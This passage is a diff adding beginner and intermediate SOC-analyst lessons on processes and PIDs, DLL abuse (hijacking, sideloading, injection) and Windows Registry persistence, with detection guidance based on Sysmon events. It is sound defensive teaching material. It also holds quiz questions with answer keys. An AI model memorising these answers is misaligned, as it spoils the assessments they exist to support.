@@ -3111,6 +3111,636 @@ const NEW_TOPIC_LESSONS = [
   "estimatedMinutes": 44,
   "researchUsed": false,
   "createdAt": "2026-08-15T00:00:00.000Z"
+},
+{
+  "id": "topic-lesson-processes-pids-process-tree",
+  "slug": "processes-pids-and-the-process-tree",
+  "title": "Processes, PIDs, and the Process Tree",
+  "topic": "Operating System Fundamentals",
+  "difficulty": "beginner",
+  "kind": "lesson",
+  "intro": "Almost every investigation a SOC analyst runs comes down to one question: what was running on this machine, and did it belong there? Answering it means understanding processes — what they are, how the operating system names them with PIDs, and how each one is born from a parent, forming a family tree that tells the story of an attack. This beginner lesson builds that foundation from scratch: what a process actually is, how process IDs work, why the parent-child relationship is the single most important idea in endpoint investigation, and how to read a process tree to spot the intruder hiding in plain sight.",
+  "sections": [
+    {
+      "heading": "What Is a Process?",
+      "content": "A **process** is a program that is actually running. There is an important distinction here: a **program** is a file sitting on disk (like `chrome.exe` or `/usr/bin/python3`) — passive, doing nothing. When you launch it, the operating system loads that file into memory and starts executing it, and *that* running instance is a **process**. The same program can run as several processes at once; open three browser windows and you may have several browser processes, each a separate running instance of the same program file.\n\nWhen the operating system creates a process, it gives that process its own private set of resources:\n\n- **Memory space** — its own area of RAM to hold code and data, isolated from other processes so one crashing program does not corrupt another.\n- **Threads** — one or more streams of execution (the actual sequence of instructions being run). A process always has at least one thread.\n- **Handles** — references to things the process is using, like open files, network connections, or registry keys.\n- **A security context (token)** — *who* the process is running as. This determines its permissions: a process running as an administrator can do far more than one running as an ordinary user.\n\nThat last point is why processes matter so much to security. **A process acts with the privileges of whatever account it runs under.** When an attacker gets their code running inside a process — especially a privileged one — that code inherits those privileges. Much of endpoint defence is about noticing *which* processes are running, *what* they are doing, and *whose* authority they carry.\n\nFor an analyst, the mental shift is to stop thinking about \"programs\" and start thinking about \"running processes,\" because that is what you actually see in your tools. Task Manager on Windows and commands like `ps` and `top` on Linux list the live processes on a machine. Your EDR records them. When an alert fires, you are almost always looking at a process: what it is, where its file lives, what command line launched it, and — the subject of the rest of this lesson — where it came from."
+    },
+    {
+      "heading": "Process IDs (PIDs) — How the OS Names Every Process",
+      "content": "With potentially hundreds of processes running at once, the operating system needs a way to tell them apart. It does this with a **PID — a Process ID** — a unique number assigned to each process when it starts. If you see `PID 4728`, that number refers to exactly one running process on that machine at that moment.\n\nA few practical facts about PIDs that every analyst should internalise:\n\n- **PIDs are unique at a given time**, but **they are reused.** When a process ends, its PID is freed and can be handed to a brand-new, unrelated process later. So `PID 4728` this morning and `PID 4728` this afternoon may be two completely different programs. This is why you never identify a process by PID alone across time — you pair it with the process name, start time, and the machine.\n- **PIDs are how tools refer to a specific process.** To end a runaway process you \"kill\" it by PID; to inspect what a process is doing you point your tool at its PID. On Linux, `kill 4728` targets that process; on Windows, tools do the same behind the scenes.\n- **Some PIDs are special.** On Linux, **PID 1** is always the first process the system starts (`init` or `systemd`), the ancestor of everything else. On Windows, low PIDs belong to core system processes.\n\nThe reason PIDs matter for investigation is that they are the thread you pull to follow activity. An alert names a PID; you use it to find the process's file path, its command line, its network connections, and — crucially — its **parent**. Because PIDs get reused, good telemetry records not just the PID but the process's full identity (image path, hashes, command line, and start time) so you can be certain *which* instance you are looking at.\n\nThis is also why attackers cannot simply hide behind a number. Even if malware picks a convincing name, the PID lets your tools tie together everything that one specific running instance did — every file it touched, every connection it made, every child it spawned. Which brings us to the most important relationship of all: who launched whom."
+    },
+    {
+      "heading": "Parent and Child Processes",
+      "content": "Processes do not appear from nowhere. **Every process is created by another process** — the one that launches it is the **parent**, and the new one is the **child**. When you double-click an app, the process behind your desktop launches it, becoming its parent. That launched app might in turn open a helper, becoming a parent itself. The result is a family tree of processes, and reading that tree is the heart of endpoint investigation.\n\nJust as a PID identifies a process, the **PPID (Parent Process ID)** records which process was its parent. Together, PIDs and PPIDs let you reconstruct the entire ancestry: this process was launched by that one, which was launched by another, all the way back to the root.\n\n**Why does the SOC care so intensely about parent-child relationships?** Because legitimate software launches other software in *predictable* patterns, and attacks break those patterns. Certain parent-child pairs are normal; others are a screaming alarm. Consider these:\n\n- A **Word document** (`winword.exe`) launching **PowerShell** (`powershell.exe`) is deeply abnormal. Word has no legitimate reason to spawn a scripting engine — this is the classic signature of a **malicious macro** in a phishing document.\n- A **web server** process (`w3wp.exe`) launching a **command shell** (`cmd.exe`) strongly suggests a **web shell** — an attacker running commands through a compromised website.\n- **PowerShell** spawned by an unusual parent, then reaching out to the internet, is a common malware-execution chain.\n\nNone of these is suspicious because of the child alone — PowerShell and cmd are normal, useful tools. They are suspicious because of *who launched them*. This is the concept of **process lineage** or **ancestry**, and it is why modern telemetry always records the parent. The Windows **Sysmon** tool's process-creation event (Event ID **1**) captures exactly this: the process image, its command line, and the **parent image and parent command line** — precisely so an analyst can ask, \"does this parent launching this child make sense?\"\n\nThe skill to build is a sense of *normal* lineage, so the abnormal jumps out. An attacker's code has to run as *some* process, launched by *some* parent — and that parentage is very often the tell that separates a live intrusion from ordinary activity."
+    },
+    {
+      "heading": "Reading the Process Tree in an Investigation",
+      "content": "Put PIDs, PPIDs, and parent-child relationships together and you get the **process tree** — a hierarchical view of every process and who spawned it. Learning to read it is what turns a pile of individual events into the narrative of an attack.\n\n**What a healthy tree looks like.** On Windows, a few well-known processes anchor the tree, and knowing them lets you spot impostors:\n\n- **System** and core processes sit near the root.\n- **`services.exe`** launches **`svchost.exe`** instances, which host Windows services.\n- **`explorer.exe`** (the desktop) is the parent of the apps a *user* launches — browsers, Office, etc.\n\nAttackers must insert their activity *somewhere* into this tree, and the insertion point is often where they give themselves away.\n\n**A worked example.** Suppose an alert fires on a suspicious PowerShell process. You pull its process tree and walk **backwards** through the ancestry:\n\n1. The PowerShell process (child).\n2. Its parent: `winword.exe`.\n3. Word's parent: `explorer.exe` — the user opened the document themselves.\n\nIn three steps the tree has told you the whole initial-access story: a user opened a Word document (likely phishing), a macro launched PowerShell, and PowerShell is now doing something that tripped an alert. Then you walk **forwards** from the PowerShell process to see its own children and network connections — did it download a payload, spawn `cmd.exe`, or connect out to a command-and-control server? That reveals what the attack did *next*.\n\n**Two analyst habits make this reliable.** First, watch for **impersonation of trusted names**: malware may name itself `svch0st.exe` or run a real-looking `svchost.exe` from the wrong folder or under the wrong parent. The tree exposes this because a legitimate `svchost.exe` is launched by `services.exe`, not by a random user process. Second, remember that a suspicious child with an *innocent* parent, or an innocent child with a *suspicious* parent, both deserve scrutiny — the relationship is the signal.\n\nThe process tree is, in effect, the crime-scene reconstruction of the endpoint. The alert tells you *something* happened; the PIDs and PPIDs let you rebuild the exact sequence — patient zero, the execution chain, and the blast radius — which is exactly what you need to scope and contain the incident."
+    }
+  ],
+  "keyTakeaways": [
+    "A process is a running instance of a program, with its own memory, threads, handles, and a security token that gives it the privileges of the account it runs under — which is why what an attacker's code can do depends on the process it runs inside.",
+    "A PID (Process ID) uniquely names each running process but is reused after a process ends, so analysts identify a process by PID plus name, path, and start time — never PID alone across time.",
+    "Every process has a parent (recorded as the PPID); legitimate software launches other software in predictable patterns, so abnormal parent-child pairs (winword.exe->powershell.exe, w3wp.exe->cmd.exe) are among the strongest attack signals, captured by Sysmon Event ID 1.",
+    "The process tree (PIDs + PPIDs) lets you reconstruct an attack: walk backward through ancestry to find root cause (e.g. a phishing document) and forward to find what executed next (payloads, shells, C2) — and it exposes impostors running trusted names from the wrong parent or path."
+  ],
+  "quiz": [
+    {
+      "question": "An EDR alert fires on a PowerShell process. You examine the process tree and find its parent process is winword.exe (Microsoft Word), whose own parent is explorer.exe. Why is this parent-child chain a strong indicator of an attack?",
+      "options": [
+        {
+          "label": "It is completely normal, because Microsoft Word routinely launches PowerShell to render documents, so the chain shows healthy everyday activity and needs no review.",
+          "value": "a"
+        },
+        {
+          "label": "Word has no legitimate reason to spawn PowerShell, so this lineage matches a malicious macro in a document the user opened — a classic phishing execution chain.",
+          "value": "b"
+        },
+        {
+          "label": "It proves the machine is safe, because explorer.exe being the top parent guarantees that every process beneath it was digitally signed and approved.",
+          "value": "c"
+        },
+        {
+          "label": "The concern is only that PowerShell is inherently malicious software, so the identity of the parent process is irrelevant to judging whether this is an attack.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "Word spawning PowerShell is abnormal lineage — a word processor has no legitimate reason to launch a scripting engine — and with explorer.exe above it, the chain shows a user opened a document whose macro ran PowerShell, the classic phishing execution pattern. Option a is false because Word does not normally launch PowerShell. Option c is wrong because explorer.exe being the ancestor guarantees nothing about safety. Option d is wrong because PowerShell is a legitimate tool; the parent's identity is exactly what makes this suspicious."
+    },
+    {
+      "question": "During an investigation you note that PID 4728 was a suspicious process this morning, but the same PID now belongs to a normal system service this afternoon. What does this illustrate about process IDs?",
+      "options": [
+        {
+          "label": "PIDs are permanent, so a single PID always refers to the exact same process forever, meaning this must be the identical program still running from the morning.",
+          "value": "a"
+        },
+        {
+          "label": "PIDs are unique at any moment but are reused after a process ends, so the same number can later belong to a completely different, unrelated process.",
+          "value": "b"
+        },
+        {
+          "label": "PIDs are assigned alphabetically by program name, so two processes sharing PID 4728 must be different versions of the very same application.",
+          "value": "c"
+        },
+        {
+          "label": "A repeated PID always signals malware impersonation, so the afternoon service is definitely the morning's suspicious process wearing a disguise.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "PIDs are unique only at a given moment; when a process ends, its PID is freed and can be reassigned to a new, unrelated process, so the same number across time can mean two different programs — which is why analysts pair PID with name, path, and start time. Option a is wrong because PIDs are not permanent. Option c invents an alphabetical scheme that does not exist. Option d over-reads a normal reuse as guaranteed impersonation."
+    }
+  ],
+  "references": [
+    "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer",
+    "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
+    "https://attack.mitre.org/techniques/T1059/"
+  ],
+  "xp": 200,
+  "estimatedMinutes": 38,
+  "researchUsed": false,
+  "createdAt": "2026-08-15T00:00:00.000Z"
+},
+{
+  "id": "topic-lesson-dll-explained",
+  "slug": "dlls-explained-shared-libraries-and-abuse",
+  "title": "DLLs Explained: Shared Libraries and How Attackers Abuse Them",
+  "topic": "Windows Fundamentals",
+  "difficulty": "intermediate",
+  "kind": "lesson",
+  "intro": "Open almost any Windows program and you will find it quietly loading dozens of files ending in .dll. These are DLLs — shared libraries of code that programs borrow instead of building everything themselves. They are fundamental to how Windows works, and precisely because they are so trusted and so numerous, they are a favourite hiding place for attackers. This lesson explains what a DLL actually is, how programs load them, and the family of techniques — hijacking, sideloading, and injection — that turn this everyday mechanism into a stealthy attack, along with what those attacks look like in your telemetry.",
+  "sections": [
+    {
+      "heading": "What Is a DLL?",
+      "content": "A **DLL — Dynamic Link Library** — is a file containing code and data that multiple programs can share, rather than each program carrying its own copy. The name unpacks its purpose: it is a **library** of reusable functions, **linked** to a program **dynamically** (at run time, not baked in when the program was built).\n\nThe real-life analogy is a shared toolbox in a workshop. Instead of every worker owning a full set of identical tools, they share one well-stocked toolbox and grab what they need. DLLs are Windows' shared toolbox: common tasks like drawing windows, opening files, or making network connections live in DLLs that any program can call.\n\nThis matters for two reasons:\n\n- **Efficiency and reuse.** Dozens of programs can use the same DLL, saving disk space and memory, and letting Microsoft fix a bug in one shared library rather than in every program.\n- **Windows itself is built from DLLs.** The core Windows API is delivered as DLLs. You will see the same handful constantly: **`kernel32.dll`** (core system functions), **`ntdll.dll`** (the low-level interface to the Windows kernel), **`user32.dll`** (windows and user interface), and **`advapi32.dll`** (security and registry). When a program does almost anything, it is calling functions inside these DLLs.\n\nContrast this with **static linking**, where a program bundles all the code it needs directly into its own `.exe`. Dynamic linking with DLLs is the Windows norm: the `.exe` is relatively small and pulls in the shared libraries it needs when it runs.\n\nFor an analyst, the key idea is that **a running process is not just its `.exe` — it is that executable plus all the DLLs it has loaded into its memory.** That is a strength for attackers: if they can get *their* code loaded as a DLL inside a trusted process, their code runs with that process's identity and privileges, wrapped in the legitimacy of a normal program. Understanding how DLLs get loaded, the next section, is what reveals how that abuse happens."
+    },
+    {
+      "heading": "How Programs Load DLLs — and the Search Order",
+      "content": "A program gets a DLL's code into its process in one of two ways, and the difference matters for how attackers abuse it.\n\n**Implicit (load-time) linking.** Most DLLs a program needs are listed in the executable itself, and Windows loads them automatically the moment the program starts. The program simply expects `kernel32.dll` and friends to be there.\n\n**Explicit (run-time) loading.** A program can also load a DLL on demand while running, by calling the Windows function **`LoadLibrary`** with a DLL's name, and then reaching into it for a specific function. This is how plugins and optional features work.\n\nThe security-critical detail is **how Windows finds a DLL when only its name is given.** If a program asks to load `helper.dll` without specifying exactly where it lives, Windows searches a defined sequence of locations — the **DLL search order** — until it finds a file by that name. Simplified, it looks in places like the folder the application launched from, then system folders like `System32`, then folders on the system `PATH`.\n\nThis search behaviour is the root of an entire attack class. **If an attacker can place a malicious `helper.dll` in a location Windows checks *before* the legitimate one, the program will load the attacker's DLL instead — while believing it loaded the real thing.** The program is not exploited in the traditional sense; it is simply tricked into picking up the wrong file because of where that file sits.\n\nTwo Windows tools also let DLLs be run more directly, and both show up in attacks:\n\n- **`rundll32.exe`** is a built-in program whose job is literally to run a function inside a DLL. Attackers abuse it to execute malicious DLL code while appearing to use a legitimate Windows binary (a living-off-the-land technique).\n- **`regsvr32.exe`** registers DLLs and can be abused similarly to execute code.\n\nSo the loading mechanism gives attackers several openings: substitute a DLL that a program will search for and load, or use trusted Windows binaries to run a DLL of their choosing. The next section walks through the specific techniques by name."
+    },
+    {
+      "heading": "How Attackers Abuse DLLs",
+      "content": "Because DLLs are trusted, numerous, and loaded automatically, they support several of the most common stealth techniques in modern intrusions. Three matter most to an analyst.\n\n**DLL Search-Order Hijacking.** The attacker exploits the search order from the previous section: they drop a malicious DLL with the name a program expects into a folder Windows checks first (often the application's own directory). When the program runs and searches for that DLL, it loads the attacker's version instead of the genuine one. The malicious code now runs inside a legitimate, often signed, application. MITRE ATT&CK tracks this as **Hijack Execution Flow: DLL Search Order Hijacking**.\n\n**DLL Sideloading.** A close cousin: the attacker brings along a *legitimate, signed* executable that is known to load a particular DLL, and places their malicious DLL alongside it. The trusted `.exe` dutifully loads the attacker's DLL. Because the executable is genuinely signed by a real vendor, this bypasses many trust checks — the malice is in the DLL sitting next to it, not the `.exe`. This is a favourite of advanced actors precisely because it launders their code through a reputable program.\n\n**DLL Injection.** Rather than tricking a program at load time, the attacker forces their DLL into an *already-running* process. Using Windows functions, they allocate memory inside the target process and make it load the malicious DLL. The attacker's code now executes from within, say, a normal browser or system process — inheriting its identity, its network reputation, and its privileges. This is one form of the broader **process injection** family.\n\nWhat unites all three is the goal of **execution under a trusted identity**. The attacker's code does not run as an obviously suspicious new program; it runs *inside* something Windows and your tools already trust. That is what makes DLL abuse stealthy and why signature-based defences, which focus on the `.exe`, often miss it.\n\nA related giveaway to remember: attackers frequently pair these techniques with **`rundll32.exe`** to launch DLL code directly, so a `rundll32` command line pointing at an unusual DLL or an odd path is a classic hunting lead."
+    },
+    {
+      "heading": "Seeing DLL Abuse in Your Telemetry",
+      "content": "DLL abuse is stealthy, but it is not invisible — it leaves distinct traces if you know where to look. The key is that loading a DLL, and dropping a DLL on disk, are both observable events.\n\n**The core signal: module (image) load events.** The Windows **Sysmon** tool records every DLL a process loads as **Event ID 7 (Image Loaded)**, capturing the loading process, the DLL's path, and its signature status. This is the workhorse for DLL hunting. What you look for is *anomaly*:\n\n- A **DLL loading from an unusual path** — a legitimate-sounding DLL in a user's Downloads or Temp folder, or in an application directory where it does not belong, rather than in `System32`.\n- An **unsigned DLL, or one signed by an unexpected vendor**, loaded into a trusted process.\n- A **well-known DLL name appearing in the wrong place**, the fingerprint of search-order hijacking and sideloading.\n\n**Supporting signals:**\n\n- **File-creation events** (Sysmon Event ID 11) showing a DLL being *written* to an application folder shortly before that application loads it — the setup step for hijacking/sideloading.\n- **Process and command-line telemetry** for **`rundll32.exe`** and **`regsvr32.exe`** invoking DLLs from odd locations or with suspicious arguments.\n- **Process injection indicators** (Sysmon Event IDs around remote-thread creation) when a DLL is forced into another process.\n\n**How to hunt.** Baseline what \"normal\" DLL loading looks like for your critical applications, then hunt for deviations: DLLs loaded from user-writable directories, unsigned modules in signed processes, and trusted binaries loading DLLs they normally never touch. Tie any find back to the **process tree** from the processes lesson — a sideloaded DLL often accompanies a freshly dropped executable and a suspicious parent, so the surrounding lineage strengthens the case.\n\nThe defensive mindset is to treat a *trusted process behaving untrustworthily* as the alarm. Because DLL abuse deliberately hides inside legitimate programs, you cannot rely on the process name; you rely on the details — *where* its DLLs came from, *whether* they are signed, and *whether* this program has any business loading them. Those details are exactly what module-load telemetry gives you."
+    }
+  ],
+  "keyTakeaways": [
+    "A DLL (Dynamic Link Library) is a shared library of code that programs load at run time instead of bundling their own copy; Windows itself is built from DLLs like kernel32.dll, ntdll.dll, and user32.dll, and a running process is its .exe plus all the DLLs loaded into it.",
+    "When a program loads a DLL by name, Windows follows a defined search order, and if an attacker places a malicious DLL in a location searched first, the program loads it while believing it is the real one.",
+    "The main abuse techniques are DLL search-order hijacking (drop a same-named DLL in a searched-first folder), DLL sideloading (place a malicious DLL beside a legitimate signed .exe that loads it), and DLL injection (force a DLL into a running process) — all aiming for execution under a trusted identity.",
+    "Hunt DLL abuse with Sysmon Event ID 7 (image loaded): look for DLLs from unusual/user-writable paths, unsigned or wrong-vendor DLLs in trusted processes, well-known names in the wrong place, plus rundll32/regsvr32 loading odd DLLs — and tie findings back to the process tree."
+  ],
+  "quiz": [
+    {
+      "question": "An attacker places a malicious DLL named the same as one a legitimate signed application expects, in the application's own folder, so that when the app runs it loads the attacker's DLL instead of the genuine one. What is this technique called, and why is it effective?",
+      "options": [
+        {
+          "label": "It is called static linking, and it works because the malicious code is compiled directly into the application's executable before it is ever signed.",
+          "value": "a"
+        },
+        {
+          "label": "It is DLL search-order hijacking, and it works because Windows searches certain folders first, so the attacker's DLL is found and loaded inside a trusted program.",
+          "value": "b"
+        },
+        {
+          "label": "It is a firewall bypass, and it works because DLLs travel over the network on trusted ports that perimeter defences are configured to always allow.",
+          "value": "c"
+        },
+        {
+          "label": "It is called PID reuse, and it works because the malicious DLL inherits the process ID of a system service that antivirus has already whitelisted.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "Placing a malicious DLL with an expected name where Windows searches before the legitimate copy is DLL search-order hijacking; it is effective because the trusted (often signed) program loads the attacker's DLL believing it is genuine, so the code runs under that program's identity. Option a describes static linking, which is unrelated. Option c invents a network mechanism DLL loading does not use. Option d confuses this with PID reuse, which has nothing to do with DLL loading."
+    },
+    {
+      "question": "Which telemetry is most directly useful for detecting a sideloaded or hijacked DLL, and what specifically would you look for?",
+      "options": [
+        {
+          "label": "Firewall allow/deny logs, looking for the exact moment the DLL file was transmitted inbound over TCP port 445 from the attacker's server.",
+          "value": "a"
+        },
+        {
+          "label": "Sysmon Event ID 7 (image loaded), looking for a DLL loaded from an unusual or user-writable path, or an unsigned DLL inside a trusted process.",
+          "value": "b"
+        },
+        {
+          "label": "The Windows Registry Run keys, looking for the DLL's full contents stored as a value that executes automatically at every user logon.",
+          "value": "c"
+        },
+        {
+          "label": "DHCP lease records, looking for the DLL requesting its own IP address so it can communicate with the rest of the corporate network.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "Sysmon Event ID 7 records every DLL a process loads with its path and signature status, so it is the workhorse for spotting sideloading and hijacking: a DLL from an unusual or user-writable path, or an unsigned/wrong-vendor DLL inside a trusted process, is the anomaly. Option a describes network transfer, not DLL loading. Option c misdescribes Run keys, which do not store DLL contents. Option d is nonsensical because DLLs do not request IP addresses."
+    }
+  ],
+  "references": [
+    "https://attack.mitre.org/techniques/T1574/001/",
+    "https://attack.mitre.org/techniques/T1574/002/",
+    "https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order"
+  ],
+  "xp": 210,
+  "estimatedMinutes": 40,
+  "researchUsed": false,
+  "createdAt": "2026-08-15T00:00:00.000Z"
+},
+{
+  "id": "topic-lesson-windows-registry-fundamentals",
+  "slug": "windows-registry-fundamentals",
+  "title": "The Windows Registry: Fundamentals for Analysts",
+  "topic": "Windows Fundamentals",
+  "difficulty": "beginner",
+  "kind": "lesson",
+  "intro": "Behind almost every setting on a Windows machine — from your desktop wallpaper to which programs start at boot — sits the Registry: a vast, hierarchical database that stores the configuration of Windows and everything installed on it. For a SOC analyst the Registry is both a map of how a system is configured and one of the most common places attackers hide to survive a reboot. This lesson explains what the Registry is, how it is structured into hives, keys, and values, the specific locations that matter for security, and how to read Registry activity in your telemetry.",
+  "sections": [
+    {
+      "heading": "What the Registry Is",
+      "content": "The **Windows Registry** is a central, hierarchical database that stores configuration settings for the operating system, hardware, installed applications, and user preferences. Almost everything Windows needs to remember about *how it should behave* lives here: which programs run at startup, file associations, driver settings, installed software, user profiles, and countless security-relevant options.\n\nThe cleanest analogy is a giant, organised **settings filing cabinet** for the whole computer. Where a phone keeps its settings in one Settings app, Windows keeps its settings — millions of them — in this single structured database that programs read and write constantly, usually without the user ever seeing it.\n\nYou can view the Registry with the built-in **Registry Editor** (`regedit`), which presents it as a tree you can browse, much like folders and files. But most Registry activity is invisible and automatic: when you install a program, it writes settings into the Registry; when Windows boots, it reads the Registry to know what to load; when you change a setting, that change is stored there.\n\nWhy does this matter so much to security? Two reasons that run through the whole lesson:\n\n- **The Registry controls what runs and how the system behaves.** If an attacker can write to the right place, they can make their malware launch automatically, weaken a security setting, or change how Windows handles something — all through configuration, without dropping an obviously malicious program.\n- **It is a durable place to hide.** Registry changes survive reboots. An attacker who only has code running in memory loses everything when the machine restarts; an attacker who has planted a Registry entry that relaunches their malware at boot has **persistence**.\n\nFor an analyst, the Registry is therefore both a rich source of evidence about a system's state and a prime hunting ground for attacker footholds. To use it, you first need to understand how it is organised — the subject of the next section."
+    },
+    {
+      "heading": "Hives, Keys, and Values",
+      "content": "The Registry is organised like a filing system, with three levels of structure an analyst should know by name.\n\n**Keys** are the containers, equivalent to folders. They can contain other keys (subkeys) and can nest many levels deep, forming the Registry's tree. A full path to a key reads like a folder path, for example `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows`.\n\n**Values** are the actual settings stored inside keys, equivalent to the files inside folders. Each value has a **name**, a **type** (such as a string, a number, or binary data), and its **data** (the setting itself). So a key is *where* a setting lives, and a value is the setting.\n\n**Hives** are the top-level branches — the major sections the whole tree is divided into. There are five you will meet, usually abbreviated:\n\n| Hive | Abbreviation | What it holds |\n|------|--------------|---------------|\n| HKEY_LOCAL_MACHINE | **HKLM** | System-wide settings for the whole machine and all users |\n| HKEY_CURRENT_USER | **HKCU** | Settings for the currently logged-on user |\n| HKEY_USERS | HKU | Settings for all user profiles on the machine |\n| HKEY_CLASSES_ROOT | HKCR | File associations and program registrations |\n| HKEY_CURRENT_CONFIG | HKCC | The current hardware profile |\n\nThe two that dominate investigations are **HKLM** and **HKCU**. The distinction is important and security-relevant: **HKLM** affects the *entire machine* and normally requires administrator rights to change, while **HKCU** affects only the *current user* and can be changed by that user without admin rights. This is why some persistence lives in HKCU (any user can write it) and some in HKLM (broader effect, needs privilege) — the choice tells you something about the attacker's access level.\n\nUnderstanding this structure lets you read any Registry path in a log or report: you can immediately see which hive (whole machine or one user), navigate the key path (the folders), and interpret the value (the specific setting) and its data. With that literacy, the security-critical locations in the next section become meaningful rather than mysterious."
+    },
+    {
+      "heading": "The Registry Locations That Matter for Security",
+      "content": "Of the millions of Registry values, a relatively small set is disproportionately important to attackers and defenders. Knowing these by category lets you focus your attention.\n\n**Autorun / persistence keys — the big one.** Certain keys tell Windows to run a program automatically. The most famous are the **Run** and **RunOnce** keys:\n\n- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (runs for all users at boot)\n- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (runs when that user logs in)\n\nAny program listed in these keys launches automatically. This makes them the single most common place attackers plant **persistence** — add a value pointing at your malware, and Windows relaunches it every boot or logon. MITRE ATT&CK tracks this as **Boot or Logon Autostart Execution: Registry Run Keys**. There are many other autostart locations (services, scheduled-task references, startup folders), but Run/RunOnce are the classic hunting ground.\n\n**Service configuration.** Windows services are defined under `HKLM\\System\\CurrentControlSet\\Services`. Because a service can run malware at boot with high privilege, changes here matter (services get their own lesson).\n\n**Security-weakening settings.** Attackers modify Registry values to disable defences — turning off security features, weakening authentication settings, or disabling logging. A change to a security-relevant value is a strong signal.\n\n**Evidence of activity.** Some keys are prized in forensics because they record what happened: keys that track recently run programs, USB devices that were connected, and user activity. Analysts and incident responders mine these to reconstruct a timeline.\n\nThe practical skill is **recognising when a Registry location is security-relevant**. A new value under a Run key, a change to a service definition, or a modification to a known security setting should draw your eye immediately. Attackers rely on the Registry being enormous and noisy; your advantage is knowing the short list of places that actually matter, so a change there stands out against the background."
+    },
+    {
+      "heading": "Reading Registry Activity in Telemetry",
+      "content": "Because the Registry is where so much persistence and defense-evasion lives, watching changes to it is core detection work. Registry modifications are observable events, and a few sources capture them.\n\n**Sysmon registry events.** The **Sysmon** tool records Registry activity in three related events: **Event ID 12** (key created or deleted), **Event ID 13** (value set), and **Event ID 14** (key renamed). Event ID **13** is especially useful — it captures a value being written, including the target path and the data. A value being set under a **Run** key is exactly the kind of high-value event to alert on.\n\n**Windows Security auditing.** With object-access auditing enabled, Windows logs **Event ID 4657** when a Registry value is modified. This requires configuration but provides an audited trail of changes to sensitive keys.\n\n**Command-line and process telemetry.** Attackers often modify the Registry using the built-in **`reg.exe`** command or PowerShell. So process-creation logs showing `reg add` writing to a Run key, or PowerShell manipulating the Registry, are a complementary signal — and they tie the change back to a **process and its parent** (the lineage from the processes lesson).\n\n**How to hunt.** Focus on the short list of security-relevant locations rather than trying to watch everything:\n\n- **New or modified values under Run / RunOnce keys**, especially pointing at unusual paths (a user's Temp or Downloads folder) or at scripts.\n- **Changes to service definitions** under the Services key.\n- **Modifications to known security settings** (disabling protections or logging).\n- **`reg.exe` / PowerShell writing to autostart or security keys**, correlated with a suspicious parent process.\n\nThe unifying idea is **baseline and deviation applied to configuration**. Normal software does write to the Registry, so the goal is not to flag every change but to recognise changes that match attacker behaviour: persistence planted in an autorun key, a defence quietly disabled, a service pointed at a suspicious binary. Pair any such find with the surrounding process tree and file activity, and a lone Registry event becomes a clear picture of an attacker establishing a foothold or clearing a path."
+    }
+  ],
+  "keyTakeaways": [
+    "The Windows Registry is a central hierarchical database of configuration for the OS, hardware, apps, and users; it controls what runs and how the system behaves, and its changes survive reboots — making it both an evidence source and a prime place for attacker persistence.",
+    "It is structured as hives (top branches — HKLM for the whole machine, HKCU for the current user), keys (folders), and values (name/type/data settings); HKLM usually needs admin rights while HKCU does not, which hints at an attacker's privilege level.",
+    "The security-critical locations are autorun keys (HKLM/HKCU ...CurrentVersion\\Run and RunOnce — the classic persistence spot, MITRE Registry Run Keys), service configuration, defence-weakening settings, and forensic activity keys.",
+    "Detect Registry abuse with Sysmon Event IDs 12/13/14 (especially 13, value set) and Windows Event 4657, plus reg.exe/PowerShell command-line telemetry — focusing on new values in Run keys, service changes, and disabled protections, tied to the responsible process."
+  ],
+  "quiz": [
+    {
+      "question": "You find that malware wrote a new value pointing to itself under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. What is the attacker most likely achieving, and what does the use of HKCU (rather than HKLM) suggest?",
+      "options": [
+        {
+          "label": "They are encrypting the user's files, and HKCU indicates the malware has gained full SYSTEM-level privileges across the entire machine.",
+          "value": "a"
+        },
+        {
+          "label": "They are establishing persistence so the malware relaunches at logon, and HKCU suggests they are operating with only the current user's rights, not admin.",
+          "value": "b"
+        },
+        {
+          "label": "They are disabling the firewall, and HKCU means the change applies to every user account and every computer joined to the domain at once.",
+          "value": "c"
+        },
+        {
+          "label": "They are deleting event logs, and the Run key is where Windows stores audit records that the attacker is now overwriting to hide activity.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "A value under a Run key makes Windows launch the named program automatically at logon, which is classic persistence; using HKCU (current user) rather than HKLM (whole machine) suggests the attacker has only the user's privileges, since HKLM changes normally require admin rights. Option a wrongly ties Run keys to encryption and misreads HKCU as SYSTEM. Option c misdescribes HKCU's scope (it affects only the current user). Option d falsely claims Run keys store audit logs."
+    },
+    {
+      "question": "Which Sysmon event is most directly useful for catching persistence being planted in a Registry Run key, and why?",
+      "options": [
+        {
+          "label": "Event ID 1 (process creation), because it records the exact registry value data written and the hive the persistence was placed into.",
+          "value": "a"
+        },
+        {
+          "label": "Event ID 13 (registry value set), because it captures a value being written including the target path, so a write to a Run key stands out.",
+          "value": "b"
+        },
+        {
+          "label": "Event ID 3 (network connection), because Registry Run-key persistence is transmitted to the endpoint over the network and logged as a connection.",
+          "value": "c"
+        },
+        {
+          "label": "Event ID 7 (image loaded), because writing a Run-key value is internally performed by loading a DLL that the event records in detail.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "Sysmon Event ID 13 records a registry value being set, including the target path and data, so a value written under a Run key is exactly what it captures and is a high-value alert. Option a is wrong because Event ID 1 records process creation, not registry value data. Option c is wrong because planting a Run key is a local write, not a network event. Option d misattributes the write to a DLL image-load event."
+    }
+  ],
+  "references": [
+    "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry",
+    "https://attack.mitre.org/techniques/T1547/001/",
+    "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon"
+  ],
+  "xp": 200,
+  "estimatedMinutes": 38,
+  "researchUsed": false,
+  "createdAt": "2026-08-15T00:00:00.000Z"
+},
+{
+  "id": "topic-lesson-windows-services-fundamentals",
+  "slug": "windows-services-fundamentals",
+  "title": "Windows Services Fundamentals",
